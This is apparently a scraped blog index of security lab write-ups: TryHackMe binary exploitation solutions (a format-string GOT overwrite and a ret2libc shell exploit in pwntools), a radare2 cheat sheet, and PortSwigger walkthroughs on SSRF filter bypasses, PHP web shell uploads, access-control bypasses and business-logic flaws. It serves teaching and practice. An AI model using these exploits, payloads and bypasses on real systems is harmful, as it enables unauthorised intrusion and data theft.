2 writes instead of the single one.Holiday() function starts at 0x40123bTo better understand this, i’ve used following resource which explains this topic really well: https://axcheron.github.io/exploit-101-format-strings/We will rewrite the payload as following.from pwn import *context.binary = binary = ELF(&quot;./pwn108.pwn108&quot;, checksec=False)# PWNTools will get the offset from the binary!got_puts_address = binary.got.putsprint(&quot;GOT puts address has an offset of {}&quot;.format(hex(got_puts_address)))#fill the read bufferjunk_payload = b&quot;A&quot;*0x12#payload = p64(got_puts_address) + b&quot;%10$n&quot;#Turn the address around to avoid stopping reading because of null bytes&#39;&#39;&#39;Number of bytes to write = Desired value - bytes written so far1st write = (0x40) 64 - 0 = 642st write = (0x123b) 4667 - 64 = 4603&#39;&#39;&#39;### AAA is used for padding payload = b&quot;%64X%13$n&quot; + b&quot;%4603X%14$hnAAA&quot; + p64(got_puts_address+2) + p64(got_puts_address)&#39;&#39;&#39;with open(&quot;payload&quot;, &quot;wb&quot;) as f: f.write(junk_payload) f.write(payload)&#39;&#39;&#39;p = process()p = remote(&quot;10.10.94.223&quot;,9008)p.send(junk_payload)p.send(payload)p.interactive()PWN109 - Stack BOF - Ret2Libc The challenge is running on port 9009Let’s download the binary and start it. Binary throws an Segmentation fault error if we add longer inputFile and ChecksecAnalysisCutter DissasemblyThere are no other functions of our interest.Vulnerable function gets is vulnerable to buffer overflow and is located at rbp-0x20. As there are no other functions, we need to leak libc address which has system function in it. to actually leak that, we’d need to use another function, like puts for which the offset is knownAs return to the main function will be necessary, we need gadgets to do that. I’ll strictly be following Razvi in his video https://www.youtube.com/watch?v=TTCz3kMutSs&amp;amp;t=850s and use ROPgadget to search for them.ROPgadget --binary ./pwn109.pwn109 --depth 12 &amp;gt; gadgets.txtAs 64-bit saves data to registers (first one is RDI), the Gadget should do exactly that.E.g.,0x00000000004012a3 : pop rdi ; retLeaking the addresses from stackThis script prints the values of all three functionsfrom pwn import *context.binary = binary = ELF(&quot;./pwn109.pwn109&quot;,checksec=False)pop_rdi_ret = p64(0x00000000004012a3)ret = p64(0x000000000040101a)plt_puts = p64(binary.plt.puts)got_puts = p64(binary.got.puts)got_gets = p64(binary.got.gets)got_setvbuf = p64(binary.got.setvbuf)payload = b&quot;A&quot;*0x20payload += b&quot;B&quot;*0x8# We need to define what to actually print. Mind that data is stored in RDI, then the GOT Address and plt PUTS at lastpayload += pop_rdi_ret + got_puts + plt_putspayload += pop_rdi_ret + got_gets + plt_putspayload += pop_rdi_ret + got_setvbuf + plt_putsp = process()p.recvuntil(b&quot;ahead&quot;)p.recv()p.sendline(payload)out = p.recv().split(b&quot;\\n&quot;)leaked_puts_address = u64(out[0].ljust(8, b&quot;\\x00&quot;))leaked_gets_address = u64(out[1].ljust(8, b&quot;\\x00&quot;))leaked_setvbuf_address = u64(out[2].ljust(8, b&quot;\\x00&quot;))print(&quot;Leaked PUTS Address: {}&quot;.format(str(hex(leaked_puts_address))))print(&quot;Leaked GETS Address: {}&quot;.format(str(hex(leaked_gets_address))))print(&quot;Leaked SETVBUF Address: {}&quot;.format(str(hex(leaked_setvbuf_address))))#p.interactive()luka@yurei:~/Desktop/thm/pwn109$ python3 pwn109.py [+] Starting local process &#39;/home/luka/Desktop/thm/pwn109/pwn109.pwn109&#39;: pid 105549Leaked PUTS Address: 0x7fee0cd3ced0Leaked GETS Address: 0x7fee0cd3c5a0Leaked SETVBUF Address: 0x7fee0cd3d670If i check remotely, the end addresses of the last 3 nibbles are always the same.We can determine which libc has been used, even online on like https://libc.tip or https://libc.nullbyte.cat which already displays offsets!Final Exploitfrom pwn import *context.binary = binary = ELF(&quot;./pwn109.pwn109&quot;,checksec=False)pop_rdi_ret = p64(0x00000000004012a3)ret = p64(0x000000000040101a)main = p64(binary.symbols.main)plt_puts = p64(binary.plt.puts)got_puts = p64(binary.got.puts)got_gets = p64(binary.got.gets)got_setvbuf = p64(binary.got.setvbuf)payload = b&quot;A&quot;*0x20payload += b&quot;B&quot;*0x8# We need to define what to actually print. Mind that data is stored in RDI, then the GOT Address and plt PUTS at lastpayload += pop_rdi_ret + got_puts + plt_putspayload += pop_rdi_ret + got_gets + plt_putspayload += pop_rdi_ret + got_setvbuf + plt_putspayload += mainp = process()p=remote(&quot;10.10.178.191&quot;, 9009)p.recvuntil(b&quot;ahead&quot;)p.recv()p.sendline(payload)out = p.recvall().split(b&quot;\\n&quot;)# u64 does the opposite what p64 does. It unpacs from little endian 64bitleaked_puts_address = u64(out[0].ljust(8, b&quot;\\x00&quot;))leaked_gets_address = u64(out[1].ljust(8, b&quot;\\x00&quot;))leaked_setvbuf_address = u64(out[2].ljust(8, b&quot;\\x00&quot;))print(&quot;Leaked PUTS Address: {}&quot;.format(str(hex(leaked_puts_address))))print(&quot;Leaked GETS Address: {}&quot;.format(str(hex(leaked_gets_address))))print(&quot;Leaked SETVBUF Address: {}&quot;.format(str(hex(leaked_setvbuf_address))))# 2nd stage where we return to the main function, exploit gets once again and return to libc system to spawn a shell. Offsets below were gotten from libc.nullbyte.cat&#39;&#39;&#39; system 0x04f550 -0x30c40 gets 0x080190 0x0 puts 0x080aa0 0x910 setvbuf 0x0813d0 0x1240 open 0x10fd10 0x8fb80 read 0x110140 0x8ffb0 write 0x110210 0x90080 str_bin_sh 0x1b3e1a 0x133c8a&#39;&#39;&#39;payload = b&quot;A&quot;*0x20payload += b&quot;B&quot;*0x8# ubuntu needs ret!payload += retpayload += pop_rdi_ret + p64(leaked_gets_address + 0x133c8a)payload += p64(leaked_gets_address - 0x30c40)p.sendline(payload)p.interactive()PWN110 - todoI’ve decided to do PWN110 at some later time, as i’ve not felt ready to build my own ROP Chains ;)RADARE2 CheatSheet# Start radare2r2 -R stdin=payload -d -A ./babyecho# disaspdf @ main# Set breakpoints, e.g., before and after the calldb 0x12312312#prints stack at addresspxr @ 0xadresscomeshere# Print sectionpxr @ section..got.plt#prints string at adressps @ 0xaddresscomeshere#prints 30 bytes from rsppxr 30 @ rsp#print registersdr#prints current sectioniS.#execution continuedc# Continue for 1 commandds- `pxa @ rsp` - to show annotated hexdump- `pxw @ rsp` - to show hexadecimal words dump (32bit)- `pxq @ rsp` - to show hexadecimal quad-words dump (64bit)- `ad@r:SP` - to analyze the stack data# Restart programoo# Display vaariablesavfd.afvd local_4hRandom ScriptsLeak addresses - format string vulnfor i in `seq 1 20`; do timeout 1 echo -e &quot;%$i\\$lX&quot; | nc -q 1 10.10.42.49 9007 | grep &quot;Your current streak:&quot;;done" }, { "title": "(Portswigger/WebAcademy) - Server-side request forgery (SSRF)", "url": "/posts/Server-side_request_forgery/", "categories": "Web Application, Server-side Request Forgery", "tags": "Notes, Web Application, Portswigger", "date": "2022-10-24 09:00:00 +0200", "snippet": "IntroThis post/writeup is all about the Server-side request forgery (SSRF).I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well.TOC Intro TOC Basic SSRF against the local server Basic SSRF against another back-end system SSRF with blacklist-based input filter SSRF with whitelist-based input filter SSRF with filter bypass via open redirection vulnerability Blind SSRF with out-of-band detection Blind SSRF with Shellshock exploitation SSRF via flawed request parsingBasic SSRF against the local server This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.We can notice that we can check the stock of any product.As it can be seen above, it seems like a normal response, however let’s check how this looks like in Burp.We can see that we have URL in the POST body and response that corresponds with the one seen on the webpage, but it looks like we can trigger request to any url from the client, so let us do exactly that.As seen above, our request does show contents of the /admin page and the path to delete the carlos user in order to solve the lab is served on a silver plate ==&amp;gt; /admin/delete?username=carlosBasic SSRF against another back-end system This lab has a stock check feature which fetches data from an internal system. To solve the lab, use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos.We have same “Check stock” option, same is in the previous exercise:Vulnerability also appears to be the same, we just now don’t know on which IP the admin interface resides. This is something where Burp Intruder might help us find that out.Use Numbers as a payload set.I’ve got a hit at .189:Now delete carlos in order to solve the lab /admin/delete?username=carlosSSRF with blacklist-based input filter This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos. The developer has deployed two weak anti-SSRF defenses that you will need to bypass.Like the previous lab, start the burp in the background and check the stock as in previous labs.We can enter http://127.1 and observe that side will get loadedIf we add http://127.1/admin, we would see a &quot;External stock check blocked for security reasons&quot; Error, so admin appears to be on a blacklist.Double encoding does the job.In order to solve the lab, following request was issuedstockApi=http%3a//127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlosSSRF with whitelist-based input filter This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos. The developer has deployed an anti-SSRF defense you will need to bypass.In this lab, we again have to exploit the Check Stock function.Let’s do that and observe the request in Burp.Send the request to repeater and try some payload like http://127.0.0.1:So we need to keep stock.weliketoshop.net in the SSRF Request.Adding a parameter or puting the stock.weliketoshop.net after # did not work. stockApi=http://e@stock.weliketoshop.net = WORKS http://127.0.0.1e@stock.weliketoshop.net still WORKS stockApi=http://127.0.0.1%25%32%33@stock.weliketoshop.net WORKS where %25%32%33 is just double-encoded # stockApi=http://127.0.0.1%25%32%33@stock.weliketoshop.net/admin WORKSNow it should be self-explainatory what to do to delete carlos.SSRF with filter bypass via open redirection vulnerability This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos. The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.Just like before, start the lab, choose a product, click on Check stock while having Burp open in the background. Let’s examine the request:While checking the application following comes up/product/nextProduct?currentProductId=1&amp;amp;path=/product?productId=2 We’ve gotten into the admin portal! Can we delete carlos?Yes we can!Blind SSRF with out-of-band detection This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded. To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server.This lab reacts with an server-side request forgery when we put out URL to the Referrer header.Blind SSRF with Shellshock exploitation Collaborator is needed which is why this lab will be done later at some pointSSRF via flawed request parsing This lab is vulnerable to routing-based SSRF due to its flawed parsing of the request’s intended host. You can exploit this to access an insecure intranet admin panel located at an internal IP address.To solve the lab, access the internal admin panel located in the 192.168.0.0/24 range, then delete the user carlos.There isn’t much going on on the page, but as the title suggests it has something to do with how request is being parsed, and indeed, if we swap the host header and use the collaborators URL as path we get a callback (note the string in response which usually comes from collaborator):Now our job is simple, we just need an intruder to bruteforce the last octet in the 192.168.0.0/24.When we’ve found the IP we can append /admin to the request and grab the form in order to delete carlos user.Carlos has been deleted and lab has been solved." }, { "title": "File Upload Vulnerabilities", "url": "/posts/File_Upload/", "categories": "Web Application, File Upload Vulnerabilities", "tags": "Notes, Web Application, Portswigger", "date": "2022-10-09 09:00:00 +0200", "snippet": "IntroThis post/writeup is all about the File Upload Vulnerabilities.I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well.TOC Intro TOC Remote code execution via web shell upload Web shell upload via Content-Type restriction bypass Web shell upload via path traversal Web shell upload via extension blacklist bypass Web shell upload via obfuscated file extension Remote code execution via polyglot web shell upload Web shell upload via race conditionRemote code execution via web shell upload This lab contains a vulnerable image upload function. It doesn’t perform any validation on the files users upload before storing them on the server’s filesystem. To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner. You can log in to your own account using the following credentials: wiener:peterFor this lab we should use simple PHP script that only prints the /home/carlos/secret. I will use same script that`s been provided in File Upload article.&amp;lt;?php echo file_get_contents(&#39;/home/carlos/secret&#39;); ?&amp;gt;So let us upload the fileOur malicious PHP file has been uploadedAs image gets loaded to frontend, we can simply check the source code for location (e.g., through Inspect)We can read the secret. We should submit it to solve the lab.Web shell upload via Content-Type restriction bypass This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this. To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner. You can log in to your own account using the following credentials: wiener:peterLet us login using provided credentials wiener:peter.Then try to upload malicious PHP file:&amp;lt;?php echo file_get_contents(&#39;/home/carlos/secret&#39;); ?&amp;gt;Don’t forget to have BURP opened so we can tamper with the request later…We get following message: Sorry, file type text/php is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.Let’s check the request in Burp, send it to repeater and adjust the Content-Type to image/jpegAs it can be observed in the response above, file was succesfuly uploaded.Our malicious PHP’s location is again leaked on the front-end and it’s in the same location as in previous lab.Submit the flag to solve the lab.Web shell upload via path traversal This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability. To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner. You can log in to your own account using the following credentials: wiener:peterFor this lab we only need to find an executable directory through Directory Traversal.Let’s login and upload the malicious PHP file (same as previous lab) while having Burp opened in the background.File was uploaded, now let’s try to execute the file (same location as previous lab).Contents will be printed but not executed.Directory Traversal took few tries. I’ve put both relevant requests to repeater - the upload one and the file read one. What has worked was encoding / with %2fWe can read the file and lab’s secret flag in /files now and not in /files/avatars anymore as we’ve traversed one directory backwards.Submit the flag to solve the lab.Web shell upload via extension blacklist bypass This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist. To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner. You can log in to your own account using the following credentials: wiener:peterLet us login using provided credentials wiener:peter and upload some image. We will want to check this in Burp after upload.Find that request and send to repeater. Now uploading from files with .php5, phtml will work, but PHP code won’t execute!We will upload .htaccess file which will give directives to apache how to execute certain file types.If we try to visit the .htaccess we would get 403 Forbidden.Let’s upload shell.l33tWe should have code execution now.We can find and read the flagAlternatively we can use following payload which will display the secret flag:&amp;lt;?php echo file_get_contents(&quot;/home/carlos/secret&quot;); ?&amp;gt;There is great explanation available on youtube https://www.youtube.com/watch?v=b6R_DRT5CqQKeep in mind that .htaccess are applied on per-directory basis!Web shell upload via obfuscated file extension This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique. To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner. You can log in to your own account using the following credentials: wiener:peterLog in using provided credentials wiener:peter and upload an image. We will check the request later in Burp.We can break the extension using null byte %00File will upload and we can read the flag.Remote code execution via polyglot web shell upload This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code. To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner. You can log in to your own account using the following credentials: wiener:peterStart the lab and log in using provided credentials wiener:peterUpload one valid image and check the request in Burp. We can change the filename to something like shell.php. Payload used at the end of the image:&amp;lt;?php echo file_get_contents(&#39;/home/carlos/secret&#39;); ?&amp;gt;We can submit the flag and solve the lab.Web shell upload via race condition Lab will be solved at the later time." }, { "title": "Broken Access Control", "url": "/posts/Broken_Access_Control/", "categories": "Web Application, Broken Access Control", "tags": "Notes, Web Application, Portswigger", "date": "2022-10-08 09:00:00 +0200", "snippet": "IntroThis post/writeup is all about the Broken access control.I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well.Information disclosure is all about disclosing information that was not intended to be exposed to user, like debug page for example or leaks data that is intended for privileged or other users.TOC Intro TOC Theory Unprotected admin functionality Unprotected admin functionality with unpredictable URL User role controlled by request parameter User role can be modified in user profile URL-based access control can be circumvented Method-based access control can be circumvented User ID controlled by request parameter User ID controlled by request parameter, with unpredictable user IDs User ID controlled by request parameter with data leakage in redirect User ID controlled by request parameter with password disclosure Insecure direct object references Multi-step process with no access control on one step Referer-based access controlTheoryAccess control (or authorization) is the application of constraints on who (or what) can perform attempted actions or access resources that they have requested. In the context of web applications, access control is dependent on authentication and session management: Authentication identifies the user and confirms that they are who they say they are. Session management identifies which subsequent HTTP requests are being made by that same user. Access control determines whether the user is allowed to carry out the action that they are attempting to perform.Unprotected admin functionality This lab has an unprotected admin panel. Solve the lab by deleting the user carlos.If we check the Site map we can find /administrator-panel which is present in robots.txtWe can simply open the panel and delete the carlos and solve the labUnprotected admin functionality with unpredictable URL This lab has an unprotected admin panel. It’s located at an unpredictable location, but the location is disclosed somewhere in the application. Solve the lab by accessing the admin panel, and using it to delete the user carlosThis lab is very similar to the previous one, we however need to check the source to find the Admin panel.When we access the Admin panel, we just have to delete carlos user to solve the lab.Alternatively we could have a look in LinkFinder.User role controlled by request parameter This lab has an admin panel at /admin, which identifies administrators using a forgeable cookie. Solve the lab by accessing the admin panel and using it to delete the user carlos. You can log in to your own account using the following credentials: wiener:peterLet’s login using provided credentials wiener:carlos:If we check the request we can notice that administrator’s role is being controlled by cookie.We can change that cookie in the browser directly, or use Match and replaceEither way, go to Admin panel and delete carlos when done to solve the labUser role can be modified in user profile This lab has an admin panel at /admin. It’s only accessible to logged-in users with a roleid of 2. Solve the lab by accessing the admin panel and using it to delete the user carlos. You can log in to your own account using the following credentials: wiener:peterFirst we have to login using provided credentials wiener:peter.If we make a change to profile - we can change Email address, we would notice roleid parameter in the requestWe can modify that parameter:We can then go ahead and solve the lab by deleting carlos from Admin panelURL-based access control can be circumvented This website has an unauthenticated admin panel at /admin, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the X-Original-URL header. To solve the lab, access the admin panel and delete the user carlos.Upon starting the lab, let us go to Admin panel:Disclaimer: We get &quot;Access denied&quot;.Now at this point it was not clear to me what to do, as if i just go and add X-Original-URL header, we still end up with Access denied and cannot tell that Header is being used.If we do that in root however / and place invalid header like /invalid (taken from Solution!), we get 404 Not Found just because of X-Original-URL header.Changing X-Original-URL value to /admin, leads us unauthenticated (!) directly to the Admin panel.We now have to change the GET request to /?username=carlos and modify the header X-Original-URL: /admin/deletePS: Match and replace did not really work as then CSS,JS wasn’t loaded etc.Method-based access control can be circumvented This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin. To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator.As we were given this possibility we can login using provided administrator:admin credentials and promote administrator to admin again and check the request in burp to see what’s actualy going on.We cannot do it, but we’ve captured the request!Now login as wiener:peter and send a request to /admin-roles:Unauthorized. How about GET request?Now we see the message that username parameter is missing.Can we upgrade ourselves (wiener = normal user) to administrator?Sure we do &amp;amp; another lab has been solved!User ID controlled by request parameter This lab has a horizontal privilege escalation vulnerability on the user account page. To solve the lab, obtain the API key for the user carlos and submit it as the solution. You can log in to your own account using the following credentials: wiener:peterWhen we login we get an API key assigned!If we click on My account again, another request would be issuedWe can request for API from carlosSubmit the API Key and solve the lab!User ID controlled by request parameter, with unpredictable user IDs This lab has a horizontal privilege escalation vulnerability on the user account page, but identifies users with GUIDs. To solve the lab, find the GUID for carlos, then submit his API key as the solution. You can log in to your own account using the following credentials: wiener:peterIf we login using wiener:peter credentials that were provided by us and check the My account link, we’ll see that it’s pointing to GUID from wiener.We would now need to find the place where we could display the GUID of carlos!We can see that carlos has dropped few posts:If we check the source we’d find the carlos’s GUID&amp;lt;a href=&#39;/blogs?userId=a6e6c070-4117-4627-af43-e299301ae904&#39;&amp;gt;carlos&amp;lt;/a&amp;gt;&amp;lt;/span&amp;gt; | 12 September 2022&amp;lt;/p&amp;gt;We can use it to display the API key:User ID controlled by request parameter with data leakage in redirect This lab contains an access control vulnerability where sensitive information is leaked in the body of a redirect response. To solve the lab, obtain the API key for the user carlos and submit it as the solution. You can log in to your own account using the following credentials: wiener:peterLet’s login using provided credentials wiener:peterIf we again click on My account the id should be set.Now let’s swap it with carlos and check the Burp.We can notice the 302 redirect however page will still load and disclose the API of carlos’sSubmit the API key and solve the lab!User ID controlled by request parameter with password disclosure This lab has user account page that contains the current user’s existing password, prefilled in a masked input. To solve the lab, retrieve the administrator’s password, then use it to delete carlos. You can log in to your own account using the following credentials: wiener:peterLet’s login using provided credentials wiener:peter. If we click on My account we would notice that password get’s loaded to the frontend which is weird.Now, we can also achieve that for administrator.In order to solve the lab, we need to login using password found and login as administrator and delete carlos.Insecure direct object references This lab stores user chat logs directly on the server’s file system, and retrieves them using static URLs. Solve the lab by finding the password for the user carlos, and logging into their account.We can make use of live chat in this lab.Live chat has Download transcript option and if we use it, we can see our chat history.What happens if we swap the id of 2 with 1?Yeah, we can see the chat that belongs to other user along with the carloss password which we can use to login and solve the lab.Multi-step process with no access control on one step This lab has an admin panel with a flawed multi-step process for changing a user’s role. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin. To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator.Let’s login using administrator:admin that was provided to us.User Promotion is done in 2 steps:FIRST REQUESTPOST RequestPOST /admin-roles HTTP/1.1Host: 0afd004904aed73fc06eab33000b00a8.web-security-academy.netCookie: session=0C1CqV6e1kBdfkaON0eKHjwamc4GDKrO...Connection: closeusername=administrator&amp;amp;action=upgradeSECOND REQUESTPOST RequestPOST /admin-roles HTTP/1.1Host: 0afd004904aed73fc06eab33000b00a8.web-security-academy.netCookie: session=0C1CqV6e1kBdfkaON0eKHjwamc4GDKrO...Connection: closeaction=upgrade&amp;amp;confirmed=true&amp;amp;username=administratorNow let’s try replay same requests using wiener user.Replaying first request ends with 401 Unauthorized:Replaying second request seems to work! :)To solve the lab, simply promote wiener like seen in the screenshot above.Referer-based access control This lab controls access to certain admin functionality based on the Referer header. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin. To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator.Let’s login using provided administrator:admin and try to promote carlos user.Send the query above to Burp RepeaterLet’s login usingwiener:peter and try to use the wiener’s session. It will work if Referer header is set to hostname/admin.Lab has been solved." }, { "title": "Information Disclosure", "url": "/posts/Information_Disclosure/", "categories": "Web Application, Information Disclosure", "tags": "Notes, Web Application, Portswigger", "date": "2022-10-07 09:00:00 +0200", "snippet": "IntroThis post/writeup is all about the Bussines Logic Vulnerabilities.I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well.Information disclosure is all about disclosing information that was not intended to be exposed to user, like debug page for example or leaks data that is intended for privileged or other users.TOC Intro TOC Information disclosure in error messages Information disclosure on debug page Source code disclosure via backup files Authentication bypass via information disclosure Information disclosure in version control historyInformation disclosure in error messages This lab’s verbose error messages reveal that it is using a vulnerable version of a third-party framework. To solve the lab, obtain and submit the version number of this framework.This lab is all about the forcing an error. I’ve done it in parameterWe have the version and framework listed aboveInformation disclosure on debug page This lab contains a debug page that discloses sensitive information about the application. To solve the lab, obtain and submit the SECRET_KEY environment variable.Always keep an eye on the Site map. We can see that site leaks it’s phpinfo page.SECRET_KEY can be found inside:Source code disclosure via backup files This lab leaks its source code via backup files in a hidden directory. To solve the lab, identify and submit the database password, which is hard-coded in the leaked source code.One of the low-hanging fruits is robots.txt. We might always find pages there that are not supposed to be listed by search engines like google, bing and others of their kind.We can even see a directory listing on /backup:We can find information about the database in the ProductTemplate.java.bak which has been found before.Authentication bypass via information disclosure This lab’s administration interface has an authentication bypass vulnerability, but it is impractical to exploit without knowledge of a custom HTTP header used by the front-end. To solve the lab, obtain the header name then use it to bypass the lab’s authentication. Access the admin interface and delete Carlos’s account. You can log in to your own account using the following credentials: wiener:peterIf we login using wiener:peter and go to /admin page we’d see following message:If we send HTTP TRACE to /admin another header name reveals X-Custom-IP-Authorization: 84.138.106.72If we add the header and point to localhost’s IP 127.0.0.1 we get onto the /admin panel.We can either delete carlos from here with another GET request to /admin/delete?username=carlos or use Match and replace and get it done over browser.Information disclosure in version control history This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the administrator user then log in and delete Carlos’s account.It’s all about the GIT!! ;)As usual we start with the shop. To solve the lab we hovewer need to check what we can found in the background.Let’s check for .gitI’ve used other GIT tools in the past, but we can simply download the directory recursively using wget -r https://0a74000a03a77c9ec065ef4100520014.web-security-academy.net/.git.Easiest way to check the commit information is by git show in the .git directory.As the password change is the only change it is very easy to spot.We can use the found password with administrator user to login and delete carlos to solve the lab." }, { "title": "Business Logic Vulnerabilities", "url": "/posts/Bussines-Logic-Vulnerabilities/", "categories": "Web Application, Bussines Logic Vulnerabilities", "tags": "Notes, Web Application, Portswigger", "date": "2022-10-06 09:00:00 +0200", "snippet": "IntroThis post/writeup is all about the Business Logic Vulnerabilities.I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well.Business logic vulnerabilities are flaws in the design which usually get discovered by using the web application in a way that was not intended to be used. E.g., process from checking what is in the cart to the payment.TOC Intro TOC Excessive trust in client-side controls - define the price from the client High-level logic vulnerability - Set product quantity in negative Low-level logic flaw - Integer Overflow Solution #1 - simple Intruder and manual browser check Solution #2 - Intruder with consequent request to check total price Inconsistent handling of exceptional input - email address gets trimmed after 255 characters while registering Inconsistent security controls - change email address to gain access to internal admin panel Weak isolation on dual-use endpoint - Removal of current-password parameters while changing password Insufficient workflow validation Authentication bypass via flawed state machine - exploiting default behaviour Flawed enforcement of business rules - alternating coupon codes Infinite money logic flaw Authentication bypass via encryption oracleExcessive trust in client-side controls - define the price from the client This lab doesn’t adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a “Lightweight l33t leather jacket”. You can log in to your own account using the following credentials: wiener:peterThis is the jacked that we’re supposed to buy, i’ve alrady put it into the cart. Who doesn’t want a “l33t” jacked, right? I’ve also logged in using wiener:peter.This is the request and aparently price is getting sent from the clientI’ll remove the jacked from my cart and put a number 5000 in there, making it cost 50 Bucks: productId=1&amp;amp;redir=PRODUCT&amp;amp;quantity=1&amp;amp;price=5000Now let’s buy the l33t Jacket and solve the lab.High-level logic vulnerability - Set product quantity in negative This lab doesn’t adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a “Lightweight l33t leather jacket”. You can log in to your own account using the following credentials: wiener:peterNow we have to buy the l33t jacket again. I’ve logged in and clicked on Add to CartWhen we send the product to the cart, POST Request to /cart will be sent with following parameters/values in the body: productId=1&amp;amp;redir=PRODUCT&amp;amp;quantity=1.What happens if we change quantity to -1?We should recieve some money for buying the jacket! But that doesn’t happen. We recieve an error instead: Cart total price cannot be less than zero. Let’s add the jacket and drive the total price above 0 with another product!Lab has been solved!Low-level logic flaw - Integer Overflow This lab doesn’t adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a “Lightweight l33t leather jacket”. You can log in to your own account using the following credentials: wiener:peterProcedure is the same. Login and put the jacked in the cart.Maximum amount of quantity that we can add to the cart is set to 99.Let’s try intruder and start adding jackets to the cart. Do not put any positions:Check the cart at 6040 items:at 17236From here the price starts falling.Solution #1 - simple Intruder and manual browser checkNow we just need to make sure to stop the intruder before we hit 0 again. We wan’t to end up with the Total price between $0 and $100.00.Lab has been solved.Solution #2 - Intruder with consequent request to check total priceWe can also get results like this:To make that work i’ve used Project Options and added a Macro:And everything else in Intruder Settings stays the same exept extract grep.It’s not faster or anything like that, this solution just presents the total price in the Intruder itself!Inconsistent handling of exceptional input - email address gets trimmed after 255 characters while registering This lab doesn’t adequately validate user input. You can exploit a logic flaw in its account registration process to gain access to administrative functionality. To solve the lab, access the admin panel and delete Carlos.So it’s about registering a user. This is how registration form looks like:We also have an email clientWe should use the email shown in the email client for registration!If we register we’ll recieve a Email that looks like this:Hello!Please follow the link below to confirm your email and complete registration.https://0a3300aa04c4cf72c0d6d01200e4006e.web-security-academy.net/register?temp-registration-token=TQCEaSvNMlQZXucS22Lgj5Kkzkpv1tGfThanks,Support teamIf we try to re-register carlos we get following message: An account already exists with that usernameSo we’ve hit the bottom of this rabbit hole, so what else we have: During registration we’ll see following message If you work for DontWannaCry, please use your @dontwannacry.com email address. If we do basic directory enumeration we’d find a /admin directory.If we go to that page, we’d find Admin interface only available if logged in as a DontWannaCry user. So we need a DontWannaCry user.This part is weird, as i’m not sure why such an Email would be sent in a first place but perhaps it has been made this way to make the lab not to hard.If we register Email longer than 255 characters, the email will trim on the backend.E.g. let’s use python to generate long Email address above 255 characters:lukaosojnik@Yokai ~ % python3 -c &quot;print(&#39;a&#39;*250 + &#39;attacker@exploit-0a2e00bc04962b4bc025167101ea00bf.exploit-server.net&#39;)&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaattacker@exploit-0a2e00bc04962b4bc025167101ea00bf.exploit-server.netlukaosojnik@Yokai ~ % python3 -c &quot;print(len(&#39;a&#39;*250 + &#39;attacker@exploit-0a2e00bc04962b4bc025167101ea00bf.exploit-server.net&#39;))&quot; 318So our Email is now 318 characters long. If we register it, that’s what’s shown in the backend after logging in:Our email has got trimmed. And it’s exactly 255 characters long:lukaosojnik@Yokai ~ % python3 -c 